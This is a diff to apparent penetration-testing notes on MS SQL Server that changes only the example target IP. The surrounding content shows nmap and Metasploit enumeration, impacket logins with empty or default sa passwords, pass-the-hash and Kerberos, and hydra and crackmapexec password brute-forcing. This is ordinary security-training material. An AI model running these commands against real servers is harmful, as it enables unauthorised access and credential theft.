@@ -114,14 +114,14 @@ The classic finding chain: Mixed Mode + weak `sa` + `xp_cmdshell` enabled (or en
 ### Service scan
 
 ```shell
-sudo nmap 10.129.14.128 -sV -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info
+sudo nmap 10.0.14.128 -sV -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info
 ```
 
 ```
 PORT     STATE SERVICE  VERSION
 1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
 | ms-sql-info:
-|   10.129.14.128:1433:
+|   10.0.14.128:1433:
 |     Version:
 |       name: Microsoft SQL Server 2019 RTM
 |       number: 15.00.2000.00
@@ -129,7 +129,7 @@ PORT     STATE SERVICE  VERSION
 |       Service pack level: RTM
 |     TCP port: 1433
 | ms-sql-ntlm-info:
-|   10.129.14.128:1433:
+|   10.0.14.128:1433:
 |     Target_Name: DOMAIN
 |     NetBIOS_Domain_Name: DOMAIN
 |     NetBIOS_Computer_Name: SQL01
@@ -168,7 +168,7 @@ An alternative instance-discovery probe - it returns the server name, instance n
 
 ```shell
 msf > use auxiliary/scanner/mssql/mssql_ping
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > run
 ```
 
@@ -180,16 +180,16 @@ Handy when the instance is on a non-default port - it queries the SQL Server Bro
 
 ```shell
 # SQL authentication
-impacket-mssqlclient sa:'P4ssw0rd!'@10.129.14.128
+impacket-mssqlclient sa:'P4ssw0rd!'@10.0.14.128
 
 # SQL auth, empty password
-impacket-mssqlclient sa:''@10.129.14.128
+impacket-mssqlclient sa:''@10.0.14.128
 
 # Windows authentication
-impacket-mssqlclient -windows-auth DOMAIN/svc_sql:'Pass'@10.129.14.128
+impacket-mssqlclient -windows-auth DOMAIN/svc_sql:'Pass'@10.0.14.128
 
 # Pass-the-hash
-impacket-mssqlclient -windows-auth -hashes <LM>:<NT> DOMAIN/Administrator@10.129.14.128
+impacket-mssqlclient -windows-auth -hashes <LM>:<NT> DOMAIN/Administrator@10.0.14.128
 
 # Kerberos (with TGT in KRB5CCNAME)
 impacket-mssqlclient -windows-auth -k -no-pass DOMAIN/svc_sql@SQL01.domain.local
@@ -399,14 +399,14 @@ The captured NTLMv2 hash goes into `hashcat -m 5600` for offline cracking, or `n
 <NoiseBadge level="loud" />
 
 ```shell
-hydra -L users.txt -P passwords.txt mssql://10.129.14.128
-crackmapexec mssql 10.129.14.128 -u sa -p passwords.txt
+hydra -L users.txt -P passwords.txt mssql://10.0.14.128
+crackmapexec mssql 10.0.14.128 -u sa -p passwords.txt
 ```
 
 ```shell
 # NSE script (default port, no creds needed)
 sudo nmap -p1433 --script ms-sql-brute --script-args \
-  userdb=users.txt,passdb=passwords.txt 10.129.14.128
+  userdb=users.txt,passdb=passwords.txt 10.0.14.128
 ```
 
 ## Common chained workflows
